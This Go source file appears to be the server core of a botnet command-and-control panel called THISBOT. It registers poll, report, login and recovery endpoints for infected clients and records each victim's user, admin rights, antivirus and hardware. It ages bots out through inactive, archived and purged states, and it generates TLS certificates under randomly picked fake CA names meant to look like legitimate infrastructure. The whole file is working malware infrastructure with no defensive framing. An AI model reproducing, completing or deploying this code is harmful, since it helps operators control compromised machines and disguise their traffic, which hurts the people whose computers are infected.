package core

import (
	"ThisBot/common"
	"ThisBot/db1"
	"ThisBot/utils"
	"crypto/hmac"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/go-chi/chi/middleware"
	"github.com/go-chi/chi/v5"
)

func TaskCleaner(db *sql.DB, interval time.Duration) {
	go func() {
		ticker := time.NewTicker(interval)
		for range ticker.C {
			_, err := db1.Exec(db, `delete from tasks where status in ('done', 'failed', 'canceled') and completed_at < UTC_TIMESTAMP() - INTERVAL 3 DAY`)
			if err != nil {
				log.Println("Task cleanup error: " + err.Error())
			}
		}
	}()
}

/*
Bot status:
 1. active
 2. inactive
 3. archived
 4. purged
*/
func DeadBotCleaner(db *sql.DB) {
	// Create a goroutine to check inactive bot(checked every 3 minutes)
	// If bot sends poll within 3 minutes means ACTIVE or its INACTIVE
	go func() {
		sqlStr := "update clients set status='inactive' where lastseen < UTC_TIMESTAMP() - INTERVAL 3 MINUTE and status='active'"
		ticker := time.NewTicker(2 * time.Minute)
		defer ticker.Stop()
		//sqlStr := "update clients set status='inactive' where (lastseen >= UTC_TIMESTAMP() - INTERVAL 30 DAY) and (lastseen < UTC_TIMESTAMP() - INTERVAL 7 DAY)"
		for range ticker.C {
			_, err := db1.Exec(db, sqlStr)
			if err != nil {
				log.Println("DeadBotCleaner inactive db1.Exec error: " + err.Error())
			}
			log.Println("DeadBotCleaner inactive db1.Exec okay ")
		}
	}()
	// Create a goroutine to check ACHIVED bot(Checked every 3 days)
	go func() {
		//sqlStr := "insert into clients_archived (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) " +
		//	"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where lastseen < UTC_TIMESTAMP() - INTERVAL 30 DAY"
		//sqlDeleteStr := "delete from clients where lastseen < UTC_TIMESTAMP() - INTERVAL 30 DAY"
		sqlStr := "insert ignore into clients_archived (guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen) " +
			"select guid, token, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where status='inactive' and lastseen < UTC_TIMESTAMP() - INTERVAL 3 DAY"
		sqlUpdateStr := "update clients set status='archived' where status='inactive' and lastseen < UTC_TIMESTAMP() - INTERVAL 3 DAY"
		ticker := time.NewTicker(time.Duration(3*12) * time.Hour)
		defer ticker.Stop()
		for range ticker.C {
			tx, err := common.Db.Begin()
			if err != nil {
				log.Println("DeadBotCleaner archived tx.Begin error: " + err.Error())
				continue
			}
			_, err = tx.Exec(sqlStr)
			if err != nil {
				tx.Rollback()
				log.Println("DeadBotCleaner archived insert tx.Rollback error: " + err.Error())
				continue
			}
			// Delete record from clients table
			_, err = tx.Exec(sqlUpdateStr)
			if err != nil {
				tx.Rollback()
				log.Println("DeadBotCleaner archived delete tx.Rollback error: " + err.Error())
				continue
			}
			// Commit
			if err = tx.Commit(); err != nil {
				log.Println("DeadBotCleaner archived commit error: " + err.Error())
			}
			log.Println("DeadBotCleaner archived commit okay ")
		}
	}()
	// Create a go routine to delete purged bot(Checked per month)
	go func() {
		sqlStr := `delete from clients_archived where purged_after <= UTC_TIMESTAMP()`
		ticker := time.NewTicker(time.Duration(24*15) * time.Hour)
		defer ticker.Stop()
		for range ticker.C {
			_, err := db1.Exec(db, sqlStr)
			if err != nil {
				log.Println("DeadBotCleaner delete error: " + err.Error())
			}
			log.Println("DeadBotCleaner delete okay ")
		}
	}()
}

func http_sender(w http.ResponseWriter, guid, token string, reply *common.ServerReply) error {
	server_time := utils.GenerateUtcTimestampString()

	// Setup http reply's header
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-Guid", guid)
	w.Header().Set("X-Time", server_time)
	bytToken, _ := common.Base64Dec(token)
	hmac := common.HmacSha256(bytToken, []byte(guid+server_time))
	w.Header().Set("X-Sign", common.Base64Enc(hmac))
	// Setup http reply's body
	body, _ := json.Marshal(reply)
	// Send http reply
	_, err := w.Write(body)

	return err
}

func check_package_legality(guid string, token string, x_sign string, x_time string) bool {
	// Check overtime
	current_time := utils.GenerateUtcTimestamp()
	sent_time, _ := strconv.ParseInt(x_time, 10, 64)
	if current_time-sent_time >= 60*1000 {
		log.Printf("[💀] package overtime")
		return false
	}
	// Check sign
	bytesToken, _ := common.Base64Dec(token)
	sign := common.HmacSha256(bytesToken, []byte(guid+x_time))
	bytesSign, _ := common.Base64Dec(x_sign)

	return hmac.Equal(sign, bytesSign)
}

func RegisterRouters() *chi.Mux {
	router := chi.NewRouter()

	// router.Use(middleware.Logger)
	router.Use(middleware.Recoverer)

	router.Post("/recovery", recovery_handler)
	router.Post("/poll", poll_handler)
	router.Post("/login", login_handler)
	router.Post("/logout", logout_handler)
	router.Post("/report", report_handler)

	return router
}

func StartHTTPServer(mux *chi.Mux) {
	strPort := strconv.Itoa(common.Cfg.Server.Port)
	fmt.Println("[✅] HTTP server running on " + common.Cfg.Server.Host + ":" + strPort)
	err := http.ListenAndServe(":"+strPort, mux)
	if err != nil {
		fmt.Println("[💀] Failed to start HTTP server, please try again later")
		os.Exit(0)
	}
}

func StartHTTPSServer(mux *chi.Mux, CAPEMPath string, CAKeyPath string) {
	if !utils.FileExist(CAKeyPath) || !utils.FileExist(CAPEMPath) {
		fmt.Println("[❗] Please make sure root.key and root.pem exists and in the same folder of server application.")
		os.Exit(0)
	}
	strPort := strconv.Itoa(common.Cfg.Server.Port)
	fmt.Println("[✅] HTTPS server running on " + common.Cfg.Server.Host + ":" + strPort)

	err := http.ListenAndServeTLS(":"+strPort, CAPEMPath, CAKeyPath, mux)
	if err != nil {
		fmt.Println("[💀] Failed to start HTTPS server, please try again later")
		os.Exit(0)
	}
}

func StartServer(mux *chi.Mux) {
	if common.Cfg.Server.Tls {
		// Generate CA certificate
		if !GenerateCARoot() {
			os.Exit(0)
		}
		// Generate server certificate
		if !GenerateServerCert() {
			os.Exit(0)
		}
		// Build fullchain.pem
		srvCrt, _ := os.ReadFile(common.DefaultServerCertPath)
		rootPem, _ := os.ReadFile(common.DefaultRootCertPath)
		fullchain := append(srvCrt, rootPem...)
		fullChainPath := "./fullchain.pem"
		_ = os.WriteFile(fullChainPath, fullchain, 0644)
		// Start https server
		go StartHTTPSServer(mux, fullChainPath, common.DefaultServerKeyPath)
	} else {
		// Start http server
		go StartHTTPServer(mux)
	}
}

func GenerateServerCert() bool {
	// Use HTTPS, try to find server certificate
	if utils.FileExist(common.DefaultServerCertPath) && utils.FileExist(common.DefaultServerKeyPath) {
		fmt.Println("[✅] Server certificate is loading")
		return true
	}
	// We can decides generate a server certificate or not
	fmt.Print("[💀] Can't find server certificate, Do you want to generate it?(y/n, default is y)\nBuilder> ")
	cmd := strings.ToLower(utils.ReadFromIO())
	if cmd == "n" || cmd == "no" {
		fmt.Println("[🏴‍☠️] Thanks for using THISBOT panel, you can configure HTTP mode in config.yaml file by \"tls\" segment set to false and restart the server, bye Σ(っ °Д °;)っ")
		os.Exit(0)
	}

	for {
		// Enter a CA organization name
		fmt.Print("[⛏️] Input a server certificate authority organization name(Press \"Enter\" to generate a random one): \nBuilder> ")
		organization := strings.TrimSpace(utils.ReadFromIO())
		if len(organization) == 0 {
			// Generate a random fake CA name
			FakeCAName := []string{
				"Global Network Services", "Unified Infrastructure Group", "Enterprise Connectivity Services",
				"Core Systems Integration", "Distributed Services Group", "Applied Network Solutions", "Infrastructure Reliability Services",
			}
			organization = FakeCAName[common.Seed.Intn(len(FakeCAName))]
			fmt.Println("[✅] Organization: " + organization)
		}
		// Enter the CA root certificate valid duration
		fmt.Print("[⛏️] Please enter the valid duration of the server certificate, in the format: \"YYYY-MM-dd\"(Default is 1000-00-00)\nBuilder> ")
		duration := strings.TrimSpace(utils.ReadFromIO())
		if len(duration) == 0 {
			duration = "1000-00-00"
		}
		fmt.Println("[✅] Valid duration: " + duration)

		fmt.Print("[⛏️] Do you have domains, if not, press 'Enter' directly, or enter them split by space(example: 'xxxx.com xxxxx.org localhost')\nBuilder> ")
		var domains []string = nil
		var domains_full []string = nil
		var ips []net.IP = nil
		var ip string
		strDomains := strings.TrimSpace(utils.ReadFromIO())
		if len(strDomains) == 0 {
			ips = make([]net.IP, 0)
			fmt.Print("[⛏️] What's your VPS IP which installed your C2?\nBuilder> ")
			ip = strings.TrimSpace(utils.ReadFromIO())
			for {
				if !utils.IsLegalURLOrIP(ip) {
					fmt.Println("[💀] Illegal IP, please enter a valid IP address")
				} else {
					ips = append(ips, net.ParseIP(ip))
					fmt.Println("[✅] Current certificate IP: " + ip)
					break
				}
			}
		} else {
			domains = make([]string, 0)
			domains_full = strings.Split(strDomains, " ")
			for _, domain := range domains_full {
				if !utils.IsLegalURLOrIP(domain) {
					fmt.Println("[💀] Domain \"" + domain + "\" is illegal")
				} else {
					domains = append(domains, domain)
				}
			}
		}
		// Try to generate CA certificate
		if common.GenerateCertificate(organization, duration, domains, ips) {
			return true
		}
		fmt.Println("[⛏️] Do you want to try again?(y/n, default is y)\nBuilder> )")
		cmd = strings.ToLower(utils.ReadFromIO())
		if cmd == "n" || cmd == "no" {
			break
		}
	}
	fmt.Println("[⛏️] Failed to generate server certificate")
	return false
}

func GenerateCARoot() bool {
	// Try to find root CA
	if utils.FileExist(common.DefaultRootCertPath) && utils.FileExist(common.DefaultRootKeyPath) {
		fmt.Println("[✅] CA root certificate is loading.")
		return true
	}
	// Show banner
	tls_banner()
	// Let client decides if generate a CA certificate
	fmt.Print("[💀] Can't find CA certificate, Do you want to generate it?(y/n, default is y)\nBuilder> ")
	cmd := strings.ToLower(utils.ReadFromIO())
	if cmd == "n" || cmd == "no" {
		fmt.Println("[🏴‍☠️] Thanks for using THISBOT panel, you can configure HTTP mode in config.yaml file by \"tls\" segment set to false and restart the server, bye Σ(っ °Д °;)っ")
		os.Exit(0)
	}

	for {
		// Enter a CA organization name
		fmt.Print("[⛏️] Input a certificate authority organization name(Press \"Enter\" to generate a random one): \nBuilder> ")
		organization := strings.TrimSpace(utils.ReadFromIO())
		if len(organization) == 0 {
			// Generate a random fake CA name
			FakeCAName := []string{
				"Global Network Services", "Unified Infrastructure Group", "Enterprise Connectivity Services",
				"Core Systems Integration", "Distributed Services Group", "Applied Network Solutions", "Infrastructure Reliability Services",
			}
			organization = FakeCAName[common.Seed.Intn(len(FakeCAName))]
			fmt.Println("[✅] Organization: " + organization)
		}
		// Enter the CA root certificate valid duration
		fmt.Print("[⛏️] Please enter the valid duration of the CA certificate, in the format: \"YYYY-MM-dd\"(Default is 1000-00-00)\nBuilder> ")
		duration := strings.TrimSpace(utils.ReadFromIO())
		if len(duration) == 0 {
			duration = "1000-00-00"
		}
		fmt.Println("[✅] Valid duration: " + duration)
		// Try to generate CA certificate
		if common.GenerateRootCA(organization, duration) {
			return true
		}
		fmt.Println("[⛏️] Do you want to try again?(y/n, default is y)\nBuilder> )")
		cmd = strings.ToLower(utils.ReadFromIO())
		if cmd == "n" || cmd == "no" {
			break
		}
	}
	fmt.Println("[⛏️] Failed to generate root CA certificate")

	return false
}
